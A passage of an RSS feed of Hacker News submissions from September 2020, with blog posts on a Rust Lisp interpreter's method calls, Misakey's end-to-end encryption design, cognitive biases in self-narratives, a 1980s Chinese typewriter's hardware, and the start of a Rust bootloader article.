<span>}</span>
</pre>
</div>
<p>
We can now compile and run <code>x7</code> to see what happens:
</p>
<div>
<pre>&gt;&gt;&gt; <span>(</span>def f <span>(</span>fs::open <span>"hello-world.txt"</span><span>)</span><span>)</span>
nil
&gt;&gt;&gt; f
File&lt;/home/david/programming/x7/hello-world.txt&gt;
</pre>
</div>
<p>
Nice! We've opened a file. We can now implement some other useful methods on <code>FileRecord</code> like reading from a file:
</p>
<div>
<pre><span>impl</span> <span>FileRecord</span> <span>{</span>
  <span>/// Read the contents of a file to a String,</span>
  <span>/// rewinding the cursor to the front.</span>
  <span>fn</span> <span>read_all</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>String</span><span>&gt;</span> <span>{</span>
      <span>let</span> <span>mut</span> <span>buf</span> = <span>String</span>::new<span>()</span>;
      <span>let</span> <span>mut</span> <span>guard</span> = <span>self</span>.file.lock<span>()</span>;
      guard
          .read_to_string<span>(</span>&amp;<span>mut</span> buf<span>)</span>
          .map_err<span>(</span>|e| <span>anyhow!</span><span>(</span><span>"Failed to read to string {}"</span>, e<span>)</span><span>)</span><span>?</span>;
      <span>rewind_file!</span><span>(</span>guard<span>)</span>;
      <span>Ok</span><span>(</span>buf<span>)</span>
  <span>}</span>

  <span>/// Read the contents of a FileRecord to a string.</span>
  <span>fn</span> <span>read_to_string</span><span>(</span>&amp;<span>self</span>, <span>args</span>: <span>Vector</span><span>&lt;</span><span>Expr</span><span>&gt;</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
      <span>// </span><span>We want no arguments.</span>
      <span>exact_len!</span><span>(</span>args, <span>0</span><span>)</span>;
      <span>self</span>.read_all<span>()</span>.map<span>(</span><span>Expr</span>::<span>String</span><span>)</span>
  <span>}</span>
<span>}</span>
</pre>
</div>
<p>
We can update our <code>Record</code> implementation for <code>FileRecord</code> to include this method:
</p>
<div>
<pre><span>impl</span> <span>Record</span> <span>for</span> <span>FileRecord</span> <span>{</span>
    <span>fn</span> <span>call_method</span><span>(</span>&amp;<span>self</span>, <span>sym</span>: &amp;<span>str</span>, <span>args</span>: <span>Vector</span><span>&lt;</span><span>Expr</span><span>&gt;</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
        <span>match</span> sym <span>{</span>
            <span>"read_to_string"</span> =&gt; <span>self</span>.read_to_string<span>(</span>args<span>)</span>,
            _ =&gt; <span>unknown_method!</span><span>(</span><span>self</span>, sym<span>)</span>,
        <span>}</span>
    <span>}</span>
<span>}</span>
</pre>
</div>
<p>
And use it:
</p>
<div>
<pre>~ echo <span>"hello"</span> &gt; hello-world.txt
~ x7
&gt;&gt;&gt; <span>(</span>def f <span>(</span>fs::open <span>"hello-world.txt"</span><span>)</span><span>)</span>
&gt;&gt;&gt; <span>(</span>call_method f <span>"read_to_string"</span><span>)</span>
<span>"hello"</span>
</pre>
</div>
<p>
Awesome! We're able to call methods on <code>FileRecord</code>. It's the same process to implement <code>.write</code> and other useful file operations, so we'll elide it. This is great stuff, and would be even better with some syntactic sugar.
</p>
<p>
Let's add method call syntax so these two expressions are equal:
</p>
<div>
<pre>&gt;&gt;&gt; <span>(</span>call_method f <span>"read_to_string"</span><span>)</span>
&gt;&gt;&gt; <span>(</span>.read_to_string f<span>)</span>
</pre>
</div>
</div></div>]]>
            </description>
            <link>https://dpbriggs.ca/blog/Implementing-Method-Calls-In-x7</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514658</guid>
            <pubDate>Fri, 18 Sep 2020 09:19:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Year and a Half of End-to-End Encryption at Misakey]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514370">thread link</a>) | @cedricvanrompay
<br/>
September 18, 2020 | https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric | <a href="https://web.archive.org/web/*/https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <article>
      

<p>A journey through some of the reasonings and technical challenges that I had so far as a software developer at Misakey specialized in cryptography and security.</p>

<h2 id="how-i-got-here">How I Got Here</h2>
<p>I was recruited by Misakey shortly after its first fundraising (February 2019, €1M). The mission of Misakey was, and still is as of today, to provide an easy-to-use and highly secure way to connect people to the numerous accounts they have on other websites, as well as to connect people between each other. One key element of the solution was to encrypt user data in an <em>end-to-end</em> fashion, meaning that, while the data exchanged by users and websites would flow through our servers, it would be encrypted with a key that Misakey does not have. Doing so greatly increases the security of user’s data, but it adds a lot of technical challenges.</p>
<p><em>“Do not roll your own crypto”</em>: this adage is a reminder to software developers that cryptography is a very tricky discipline. Trying to build your own cryptography without a high degree of knowledge in this field is a sure way to introduce a security vulnerability in your product. Instead, you should rely entirely on third-party tools and services when it comes to cryptography, and you should avoid using them in a “creative” way.</p>
<p>At Misakey, we try to follow this principle as much as possible. For instance, we do TLS<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> in the most standard, boring, uncreative way. But end-to-end encryption is still quite a “bleeding-edge” technology, and as a result you are not sure to find a tool that perfectly fits your needs. In this situation, there are two sane things to do: giving up, or investing massively in cryptographic expertise.</p>
<p>The founders of Misakey went for the second option. Unfortunately, professional software developers with a high expertise in cryptography are pretty rare. So they went for the opposite approach: they started looking for an expert in cryptography that would have decent skills in software development.</p>
<p>At that time, I had recently finished my PhD on cryptography and secure protocols after graduating as an engineer from <a href="https://www.telecom-paris.fr/">Télécom Paris</a> and <a href="https://www.eurecom.fr/fr">EURECOM</a>. Although I had never worked as a professional software developer, I had been programming as a hobbyist since the age of 15, and the engineering schools I graduated from are quite specialized in I.T. After a few discussions on the phone with the founders, I was hired. The deal was that I would progressively become a professional software developer in his own right by programming with the rest of the team, while using my knowledge of cryptography to design and implement the protocols Misakey needs. I also had some training in general cyber security (“hacking”, sort of), so I would be quite active on this topic as well<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.</p>
<h2 id="end-to-end-encryption">End-to-End Encryption</h2>
<p>End-to-end encryption is really booming these years. This is sometimes taking the form of what is called “client-side encryption” in some cloud-based services, like <a href="https://blog.cozy.io/en/cozy-cloud-how-to-encrypt-web-application/">what Cozy Cloud is doing</a> for instance, but the biggest trend is “encrypted chat applications”. <a href="https://signal.org/blog/whatsapp-complete/">WhatsApp conversations use end-to-end encryption by default since 2016</a>, and <a href="https://signal.org/blog/facebook-messenger/">Facebook Messenger offers end-to-end encrypted conversations since more or less the same time</a>. <a href="https://telegram.org/">Telegram</a> is another popular chat application that offers end-to-end encryption, and there are a few other applications having a smaller market share, like <a href="https://signal.org/">Signal</a> and <a href="https://element.io/">Element</a> (formerly known as “Riot”).</p>
<figure>
    <img src="https://about.misakey.com/cryptography/images/e2e.png"> 
</figure>

<p>Before the rise of end-to-end encryption, messages were already encrypted in chat applications, but only with the TLS protocol<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> that provides encryption from a device (a computer or a phone) to a server. In TLS, the device and the server negotiate an encryption key with each other so that they communicate securely, but because this key is known to the server, the server “sees“ the data. Most of the time this is perfectly fine because the data is actually intended for the server. For instance when you change your username in Misakey, the new user name is only encrypted with TLS. For most websites, TLS is (almost) all the cryptography that’s required to operate the service securely, and nowadays it’s quite simple for anyone to enable TLS on her website in a secure way thanks to <a href="https://letsencrypt.org/">Let’s Encrypt</a> and <a href="https://certbot.eff.org/">CertBot</a>.</p>
<p>The situation is different in chat applications and in services like Misakey that simply act as intermediaries between users: the server is not one of the “ends” of the conversation anymore, it simply forwards data between users having a conversation. As a result, you cannot claim to provide “end-to-end encryption” simply because you are using TLS.</p>
<p>It doesn’t mean that a chat application using only TLS is “less secure” than a usual website. It means that we could aim at a higher level of security: if the server doesn’t <em>need</em> to see the data, we have an opportunity to protect the data from a hack of the server, and we do this by making the server <em>unable</em> to read the data.</p>
<p>It is tempting to ask: why not just use TLS from device to device, then? One reason is that TLS simply does not work from device to device: in TLS, servers do most of the work, so it is not trivial to recreate the same protocol with just devices. A second reason is that TLS will not give us some properties that we want for Misakey, like conversations between more than two devices and/or users. Of course, we will regularly see how things are done in the TLS protocol to better understand how to build our end-to-end encryption protocol, but it cannot be as simple as <em>“using TLS from device to device”</em>.</p>
<h2 id="existing-protocols-and-why-we-are-not-using-them">Existing Protocols and Why We Are Not Using Them</h2>
<p>The end-to-end encryption protocol used by WhatsApp, Facebook Messenger and Signal is the “Signal Protocol” (because it was first developed by Signal, who then helped WhatsApp and Facebook integrate it in their own app) whose <a href="https://signal.org/docs/">specification and implementation are free open-source software</a>. This means that in theory we could use it to build Misakey, but in practice the Signal protocol is not really meant to be used as a stable platform for building other end-to-end encrypted products.</p>
<p>Element is a bit different from the other encrypted chat applications. The main goal of the people behind Element is to promote an entire <em>messaging protocol</em>, called <a href="https://matrix.org/">the <em>Matrix Protocol</em></a>, whose original purpose was to <em>“replace email”</em>. Element is simply a client for this protocol, but the developers want <a href="https://matrix.org/clients-matrix/">anyone to be able to implement their own client</a>, just like there are various programs to surf the Web or manage emails.</p>
<p>As a result, the Matrix protocol and the various parts of the Element application are designed to be usable as building blocks for other implementations and usage. In particular, <a href="https://github.com/matrix-org/matrix-js-sdk">the Matrix JS SDK</a> gives you a high-level interface to use the Matrix Protocol, including the end-to-end encryption part, without having to worry too much about the technical details of it: you enable end-to-end encryption in a chat room by calling <code>matrixClient.setRoomEncryption</code> with the ID of the chat room, and now all the messages sent to this room will be end-to-end encrypted, even if there are many people in it, each one using several devices. The Matrix team also provides a server for the Matrix Protocol, <a href="https://github.com/matrix-org/synapse">Synapse</a>, which is very easy to use.</p>
<p>At the beginning of Misakey, the idea was to use the Matrix protocol as a communication platform to build our product. This way we did not have to implement end-to-end encryption ourselves, and we could enjoy a mature protocol and implementation which we would not have to maintain ourselves.</p>
<p>The Matrix protocol, and <a href="https://gitlab.matrix.org/matrix-org/olm">its end-to-end encryption protocol named “olm”</a>, are quite easy to use and to integrate in your own application … as long as the application you are trying to build is close enough to Element. Now Misakey is not exactly a “chat” application, its goal is mainly directed towards automated management of people’s accounts and data. As a result, we had some feature requirements that were quite far from what Matrix was designed for, like sending data to people that don’t have an account yet, or seamless device-to-device synchronization. Implementing them with Matrix would have required to somehow “bend” the protocol, using it in ways it was not designed for, and this seemed overly complicated.</p>
<p>There were also a few features we were missing from the Matrix JS SDK, mainly regarding key management in the olm protocol. We had no idea if we could push for their integration, and it seemed too much of a hassle to implement them in our own fork of Matrix. At some time <a href="https://github.com/matrix-org/matrix-js-sdk/pull/1167">we tried to contribute to the Matrix JS SDK</a>, but again this did not give us the speed we needed.</p>
<p>Maybe one day the Matrix protocol will become more versatile and we will be able to use it as a base for Misakey, but for now it seems faster to implement our own protocol, and to use Matrix as a source of inspiration. This lets us move faster, even if it is a great responsibility to implement end-to-end encryption from scratch. As we said, end-to-end encryption is a technology that is still quite “young”.</p>
<h2 id="the-most-trivial-end-to-end-encryption-protocol">The Most Trivial End-to-End Encryption Protocol</h2>
<p>It’s time to start building things. The quickest way of deploying end-to-end encryption between two users is to do the following: first, make the application of one user generate an encryption key. Then, tell this user to send the key to the other user through some other communication channel, typically email or some other chat application,or in person. This “other communication channel” must be secure enough. When the application of the other user receives the key, the applications of both users can use this key to encrypt data for each other.</p>
<figure>
    <img src="https://about.misakey.com/cryptography/images/basic-e2e.png" alt="chart illustrating basic end-to-end encryption with the key sent through an out-of-band channel"> 
</figure>

<p>Note that the key must <em>not</em> be sent through Misakey itself, otherwise it is not “end-to-end encryption” any more. This is why I speak of <em>another</em> communication channel. This is called an <em>out-of-band channel</em> in end-to-end encryption.</p>
<p>Of course it is not ideal to have to assume that users <em>already</em> have this out-of-band channel to send cryptographic keys to each other in a secure manner. One could …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric">https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric</a></em></p>]]>
            </description>
            <link>https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514370</guid>
            <pubDate>Fri, 18 Sep 2020 08:35:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The stories we tell ourselves can make or break who we are]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514358">thread link</a>) | @ochronus
<br/>
September 18, 2020 | https://ochronus.online/stories-we-tell-ourselves/ | <a href="https://web.archive.org/web/*/https://ochronus.online/stories-we-tell-ourselves/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<figure>
<img srcset="https://ochronus.online/content/images/size/w300/2020/09/the-stories-we-tell-ourselves.jpg 300w,
                            https://ochronus.online/content/images/size/w600/2020/09/the-stories-we-tell-ourselves.jpg 600w,
                            https://ochronus.online/content/images/size/w1000/2020/09/the-stories-we-tell-ourselves.jpg 1000w,
                            https://ochronus.online/content/images/size/w2000/2020/09/the-stories-we-tell-ourselves.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://ochronus.online/content/images/size/w2000/2020/09/the-stories-we-tell-ourselves.jpg" alt="The stories we tell ourselves">
</figure>
<section>
<div>
<blockquote>“We tell ourselves stories in order to live…We look for the sermon in the suicide, for the social or moral lesson in the murder of five. We interpret what we see, select the most workable of the multiple choices. We live entirely, especially if we are writers, by the imposition of a narrative line upon disparate images, by the “ideas” with which we have learned to freeze the shifting phantasmagoria which is our actual experience.” – <em><strong>Joan Didion</strong>, The White Album</em></blockquote><p>A good story can entertain, motivate, teach valuable lessons, and solidify good habits.</p><p>A bad story can demotivate, cause frustration and anger, and curb our capability to be fully ourselves.</p><p>These stories are not necessarily false but usually, they don’t tell the entire truth — just one perspective. Another person could look at the same situation and tell a very different story. Telling ourselves stories is natural — we all do it, all the time. There’s nothing inherently wrong with it. That said <strong><em>if we aren’t aware of this happening, we won’t understand how they shape our mood, actions, happiness, and relationships.</em></strong></p><h3 id="an-example-of-such-a-story-">An example of such a story:</h3><p><strong>The event:</strong> You submitted a pull request for review after half a day of work. Another engineer asked you to change half of your code and to increase your test coverage.</p><blockquote><strong><em>Your story:</em></strong> A nitpicking a**hole commented on every single thing I did in that pull request; I guess he has nothing better to do. I wish people stopped blocking me from making progress. Why are they always making game of me?!</blockquote><blockquote><strong><em>The other engineer’s story:</em></strong> Some terrible code almost went live today; thank god I checked that pull request! Why does it always have to be me to watch quality? It’s so sad it’s only important to me in this whole company…</blockquote><blockquote><strong><em>A bystander’s story:</em></strong> Whoa, that was some tense back-and-forth in the comments of that pull request. I wish people were just nicer to each other; we all want to do a good job at the end of the day, right?</blockquote><h2 id="roots-of-these-stories">Roots of these stories</h2><p>The most common origins of these stories are cognitive biases, our self-image made by / combined with our limiting beliefs, and our fears.</p><h3 id="our-self-image-and-limiting-beliefs">Our self-image and limiting beliefs</h3><p>Ultimately we all have an idea about what kind of a person we are. This idea subconsciously influences how we think, react, and make decisions. The image is usually closely tied to our fundamental values and worldview. Most of us want to be <em>good persons</em> in the end. What ‘right’ is is defined by these very values and core beliefs. Our self-image influences the stories we tell ourselves because we’re looking for ways to find justification in our day-to-day experience.</p><p>Thus this image can limit our perceived set of options and understanding of the world around us.</p><p>Related to the personas in the previous example:</p><ul><li>I’m the guy who gets things done (<em>might imply that I think others are slowpokes</em>)</li><li>As a professional software engineer I am the sole guardian of quality in the company (<em>might imply that I think others are careless or unprofessional</em>)</li><li>I’m the kind of person who cares for others' feelings (<em>might imply that I think others have lower EQ</em>)</li></ul><p>Of course these are simply bits and pieces of the whole image.</p><p>In all of the narratives above there are (hopefully unfounded) assumptions, lots of jumping to conclusions and unproductive, limiting language. In this particular situation, this locks the actors in the status quo, lowering the hope for change. It feels like a stalemate unless someone is willing to be more open.</p><p>By the way I’ve written a bit about this earlier in the post titled <a href="https://ochronus.online/this-is-how-i-am/"><em>This is how I am</em></a></p><h3 id="our-fears">Our fears</h3><p>Fear also changes the kind of stories you tell yourself. Living in fear means giving up agency, seeing yourself as a passive spectator or a victim. It means seeing yourself as being controlled by circumstances, the actions of others, or your own emotions. And once the story you tell yourself becomes the story of a victim, you will be more and more likely to think and behave like a victim.</p><h3 id="cognitive-biases">Cognitive biases</h3><p>A cognitive bias is a systematic pattern of deviation from norm or rationality in judgment. They are basically ‘shortcuts’ our brains take so it can increase our mental efficiency by enabling us to make quick decisions without any conscious deliberation. Cognitive biases impact us in many areas of life, including social situations, memory recall, what we believe, and our behavior.</p><p>Some relevant and common cognitive biases from the staggering list of more than 180:</p><h4 id="self-serving-bias">Self-serving bias</h4><p>Self-serving bias is our tendency to blame external forces when bad things happen and give ourselves credit when good things happen. Although it can mean evading personal responsibility for your actions, self-serving bias is a defense mechanism that protects your self-esteem. In the example above, this means that if your pull request gets thumbs up from everyone, you attribute that to you being a fantastic engineer. On the other hand, if you get three comments asking you to change things, you might see others as nitpickers or your environment to be non-supportive instead of realizing you might have some room for improvement.</p><h4 id="confirmation-bias">Confirmation bias</h4><p>Confirmation bias, also known as confirmatory bias or the “myside bias,” is people’s tendency to seek out information that supports something they already believe. This type of bias affects our critical thinking, causing people to remember the hits and forget the misses — a flaw in human reasoning. People will often cue into things that matter to them (the things that support their own beliefs) and dismiss those that don’t. Think about the other engineer overly obsessed with test coverage.</p><p>The tendency to attribute greater weight and accuracy to an authority figure’s opinion is at play here. Authority bias is the tendency to blindly follow or believe the instructions and views of a person in authority. We have a deeply rooted sense of duty to obey authority. How do you react when you get a comment on your pull request from a senior engineer you respect? How about if you get the same comment from a junior who just recently started at the company?</p><h2 id="so-what-can-we-do-about-it">So what can we do about it?</h2><p>Don’t forget that <em>we are the storytellers</em> - we have full control over the stories we make up. Everything starts with <strong>awareness</strong>. Stories are part of the software of our brains. They influence how we act, what’s important, and what to do when something goes wrong. But every software program has bugs. Awareness is your first step towards debugging.</p><p>Stop from time to time and think about the possibility that the story you’ve just created is nothing more than a story. Consider alternative stories. Try telling the same story from other characters' side, think about what their narrative would look like.</p><p>Next time you find yourself in an upsetting situation, consider changing your story. Try this exercise: Recognize and acknowledge any feelings of fear. Hint: you may need to look underneath your anger! Ask yourself, what is it about this situation that is so upsetting? What do you believe to be “true” about it that feels threatening to you? As pretty much anything else, fear can be tackled one step at a time. There are ways to re-learn to say what you mean and to do what you feel is right. The good news here is that self-reinforcement works both ways. Once you’ve practiced a bit and proven to yourself that it works (and that it’s less complicated than you thought), it gets easier to continue doing it.</p><p>We also must <strong>allow ourselves to be wrong.</strong> If we want to get closer to objective truths, we have to be able and ready to admit we were wrong, especially in the face of new data. If we can’t admit defeat, it makes us less capable of making discoveries in this world. We can avoid biases by being aware of our belief systems, whether our belief is for a religion, a political ideology, a cultural worldview, etc.. Let’s be open to disconfirmation, and allow ourselves to be wrong.</p><p>Self-compassion is an instrumental skill for reducing defensiveness and increasing your self-improvement motivation. It involves being kind and forgiving towards yourself, understanding that you are human and that other humans experience the same sort of experiences and failure and being able to identify uncomfortable thoughts without judging them.</p><blockquote>“Who are we but the stories we tell ourselves, about ourselves, and believe?“ – <em><strong>Scott Turow</strong></em></blockquote><h2 id="some-fuel-for-further-thoughts">Some fuel for further thoughts</h2><p>How do you look like as a character in others' stories? Do you like that character? What can you do so that character goes through some positive development?</p><h2 id="in-case-you-want-to-read-more-about-the-topics-in-this-article-">In case you want to read more about the topics in this article:</h2><ul><li>I highly recommend <a href="http://www.ericberne.com/games-people-play/">‘Games People Play’ by Eric Berne</a> from 1964 and it’s sequel <a href="http://www.ericberne.com/what-do-you-say-after-you-say-hello/">‘What Do You Say After You Say Hello?'</a> from 1970. The book didn’t age particularly well regarding some topics but the basic principle holds.</li><li>About cognitive bias: check out this beautiful <a href="https://www.visualcapitalist.com/wp-content/uploads/2017/09/cognitive-bias-infographic.html">visual map of cognitive biases</a> or if you like textual data more browse <a href="https://en.wikipedia.org/wiki/List_of_cognitive_biases">the relevant Wikipedia article</a> The book <a href="https://www.rickhanson.net/books/buddhas-brain/">‘Buddha’s Brain: The Practical Neuroscience of Happiness, Love, and Wisdom.'</a> - I know, such clickbaity title, but trust me, this book is pure gold.</li></ul><hr>
</div>

</section>

</article>
</div>
</div></div>]]>
            </description>
            <link>https://ochronus.online/stories-we-tell-ourselves/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514358</guid>
            <pubDate>Fri, 18 Sep 2020 08:34:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hardware Design of a 8088 based Chinese Typewriter made in the 1980s]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24514269">thread link</a>) | @tifan
<br/>
September 18, 2020 | https://tifan.net/blog/2020/09/17/ms240x-chinese-typewriter-2-ms-2401h-hardware-design/ | <a href="https://web.archive.org/web/*/https://tifan.net/blog/2020/09/17/ms240x-chinese-typewriter-2-ms-2401h-hardware-design/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <header id="banner">
      
    </header><!-- /#banner -->
    <!-- /#menu -->
<section id="content">
  <header>
    <h2>
      Stone MS-240x Typewriter (2): Hardware Design
    </h2> 
    
  </header>
  <!-- /.post-info -->
  <div>
    <p>In case you misseed it -- I talked about the backgrounds of the MS-240x typewriter in the <a href="https://tifan.net/blog/2020/09/09/revealing-a-forgotten-chinese-compute-history-stone-ms240x-chinese-typewritter-1-background/">previous article</a>. In this article, I'm going to discuss the hardware design of the legendary Stone MS-240x Chinese Typewriter (四通 MS-240x 中英文打字机) designed and sold in the mid-1980s.</p>
<p>Both the hardware and the BIOS was designed by ALPS Electric Co. ALPS provided a BIOS reference manual before the development began so that the developers in China could just write an emulator on the PC emulating the ALPS BIOS, and just focus on the development of the word processor.</p>
<div id="the-hardware">
<h2>The Hardware</h2>
<p><img alt="Stone MS-2401H 四通 MS-2401H 打字机" src="https://tifan.net/images/20200917-ms-2401h.jpg"></p><p>(<a href="https://www.lty.me/stone-ms-2401h/">Picture taken by @lty1993</a>)</p>
<p>As I mentioned in the previous article, the hardware is just a 8088 machine in its core. In the 80s, the Japanese engineer reverse engineered and implemented Japanese counterparts of almost all popular chips in the west. The ALPS motherboard is not an exception to that.</p>
<p>I bought the machine on Xianyu (Chinese eBay equivalent) and shipped it to @lty1993 in China for examination, disassembly, and ROM dumps. The machine is quite heavy -- shipping it to the west coast would probably cost 200 USD. Guess there won't be any Stone Chinese Typewriters in the US for a while!</p>
</div>
<div id="processor-nec-v20">
<h2>Processor: NEC V20</h2>
<p>Instead of using the actual 8088 processor, MS-240x series used the NEC V20 running at different clock frequencies. The original MS-2400 clocks at 4.9125 MHz, the upgraded MS-2401 runs at 8 MHz, and the later MS-2401H model runs at 10 MHz.</p>
<p>The V20 is 30% faster than the original 8088 running at the same clock speed, providing additional power for the heavy lifting work a Chinese Typewriters needs to do.</p>
</div>
<div id="memory-hard-wired-memory-map-with-page-control">
<h2>Memory: Hard-wired Memory Map with Page Control</h2>
<p>The RAM itself is not interesting at all. It's just a bunch of Japanese made SRAM connected to the address bus of the processor.</p>
<p>The BIOS is mapped at <cite>0xF8000</cite> to <cite>0xFFFF</cite>, and CPU will execute the instruction at <cite>0xFFFF0</cite> -- that's the convention for 8088. So naturally, the BIOS was hard wired at that address.</p>
<p>Remember we talked about the Chinese fonts? It's a mask ROM, and it is quite large -- larger than the address space of 8088 processor if we include high precision Chinese fonts at 24x24 dot (which is still pretty awful in today's standard). To solve this problem, all external ROMs were divided into 32KB pages. To access any page in the ROM, you would send a command to the ASIC to select the page first (bank switching) before reading memory from the hard wired memory location. Sounds like a MMU? Well, this <em>is</em> a poor man's MMU.</p>
<p>One thing worth noting is that all models have built in battery backup units. Newer models (such as MS-2401) can even operate with battery with up to 3 hours battery life -- it almost makes the typewritter a laptop with a built-in printer.</p>
<p>Here's the memory map for various models of the Chinese typewriter.</p>
<p><img alt="Memory Map for MS-2400" src="https://tifan.net/images/20200917-ms-2400-memory-map.png"></p><p>MS-2400 have the Chinese font mapped at <cite>0xA0000</cite> with 16 pages in total. It can support up to 3 Chinese IMEs (input methods, such as Pinyin, Wubi or Cangjie) -- a standard IME comes with the machine, up to 2 additional IMEs can be purchased as a EPROM chip inserted in the expansion ROM socket. As there's only 1 IME socket, regardless of how many IMEs would you purchase, you'll always get just one 64KB EPROM. The keyboards are mapped at <cite>0x90000</cite> and have up to 3 pages in total.</p>
<p>When the machine was designed, there's also an expansion socket at <cite>0xE8000</cite>. However, the expansion socket was never used.</p>
<p>As the only display device is a 240x64 LCD, the VRAM is just 2KB in size mapped at <cite>0x80000</cite>.</p>
<p><img alt="Memory Map for MS-2401" src="https://tifan.net/images/20200917-ms-2401-memory-map.png"></p><p>MS-2401 is significantly more capable with a bigger LCD display, larger RAM, and larger Chinese font ROM. To conserve mask ROM space, all font data in the mask ROM was compressed.</p>
<p><img alt="Memory Map for MS-2401H" src="https://tifan.net/images/20200917-ms-2401h-memory-map.png"></p><p>You might wonder what does "V-RAM (CRT 用)" in MS-2401H/01C mean. MS-2401H/01C is the top of the line model in MS-2401 series featuring ability to attach an external monitor. The graphics chip is <cite>MGP TM6066A</cite>, a Hercules clone, with MDA output.</p>
</div>
<div id="system-devices">
<h2>System Devices</h2>
<p>We all know the 8088 is not a very capable machine. ALPS custom made a few ASICs to connect system devices such as printers, keyboards and LCD monitors to the system. That's also what makes it extremely hard to write an emulator -- without knowing exactly how the ASIC works, it's close to impossible to emulate all devices and peripherals. Even with the original designer's help, we still can't be quite sure what is the exact IO address for each device, let alone determining what each command would do.</p>
<p>But anyway, we do have an rough idea of what the system is doing.</p>
<div id="external-storage-device">
<h3>External Storage Device</h3>
<p>The first model, MS-2400, have an audio cassette connector running at 1200bps. Each cassette can hold around 500KB of data, or 250k Chinese characters.</p>
<p>In 1986, when 3 1/2 inch disk just came out, Mr Jizhi Wang chose to use the very new technology in MS-2401. This is a killer function at that time, because digital documents could be finally archived relatively cheaply. Of course you could always use a computer, but that's a big upfront investment.</p>
</div>
<div id="keyboard">
<h3>Keyboard</h3>
<p><img alt="Memory Map for MS-2401" src="https://tifan.net/images/20200917-ms-2401-keyboard.jpg"></p><p>It's not a ANSI keyboard. The design seems to be inspired by JIS keyboard, and was fully translated into Chinese -- you can't even find "Ctrl" on the keyboard, instead, you'll see "控制" (lit. control). This flattens learning curve for the typewriter, as it doesn't feel foreign to the users. Just like we say "it's all Chinese to me" -- the Chinese users would say "it's all English to me" -- because it really is!</p>
<p>One interesting fact to point out is instead of commonly seem Esc, Tab, Caps Lock, Shift, Ctrl arrangement on the left, the keyboard is actually 半/全 (half width / full width), Tab, Ctrl, Shift, 常用字 (frequently used characters). Of course, it's a Chinese typewriter, Caps Lock isn't that important after all.</p>
</div>
<div id="printer">
<h3>Printer</h3>
<p>It sees that the printer only accepts low level commands -- or shall we say, the printer itself does not have a controller. According to the reference manual, the printer head and motor are directly controlled by the ASIC. It also needs a few dedicated timers.</p>
</div>
<div id="asic-and-fdd-controller">
<h3>ASIC and FDD Controller</h3>
<p>In MS-2401H, there are 2 ASICs, each of them contains around 8000 gates. the model is uPD91260GD-5BD and uPD91261GD-5BB.</p>
<p>The floppy controller for MS-2401 MS-2401H is UPD72067GC.</p>
</div>
</div>
<div id="conclusion">
<h2>Conclusion</h2>
<p>The MS series machines are classical examples of pushing the hardware to its limits. Most people would simply say it's impossible to use a 8088-equivalent to drive a Chinese typewriter, but the engineers did it. By abusing the system and designing chips around the 8088, they were even able to map memory larger than the actual address space of the machine! Hats off to the hardworking engineers both in Stone Company and ALPS Electric.</p>
<p>Another thing to point out is Stone Company wrote fabulous documentations. It's really pleasing to read, contains a lot of technical details, and in some occasions, it teaches you electrical engineering! It even contained the layout of the diagnostics program so that you can just disassemble them and add new functionalities should you need them.</p>
<p><img alt="manga illustration in technical document" src="https://tifan.net/images/20200917-stone-documentation-manga.png"></p><p>Plus, the manga illustration is pretty cute. Haven't seen them for a long long time.</p>
</div>


  </div><!-- /.entry-content -->
  

</section>
    <!-- /#contentinfo -->
    
    
  </div></div>]]>
            </description>
            <link>https://tifan.net/blog/2020/09/17/ms240x-chinese-typewriter-2-ms-2401h-hardware-design/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514269</guid>
            <pubDate>Fri, 18 Sep 2020 08:21:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing an x86 bootloader in Rust that can launch vmlinux]]>
            </title>
            <description>
<![CDATA[
Score 147 | Comments 49 (<a href="https://news.ycombinator.com/item?id=24514100">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://vmm.dev/en/rust/krabs.md | <a href="https://web.archive.org/web/*/https://vmm.dev/en/rust/krabs.md">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
<article id="contents">
<section>

<p>I've been developping an x86 bootloader in Rust that can use Linux boot protocol. In this article, I'd like to write about my motivation, features of this project, and issues. </p>
 
</section>
<section>
<h2>KRaBs - Kernel Reader and Booters</h2>
<p>KRaBs is a 4-stage chain loader for x86/x86_64 written in Rust.
<br>
 It can boot an ELF-formatted kernel placed on a FAT32 filesystem in the EFI System Partition. The ELF-formatted kernel is read from the filesystem and relocated, and then the kernel is booted. 
<br>
 It is all implemented in Rust. </p>
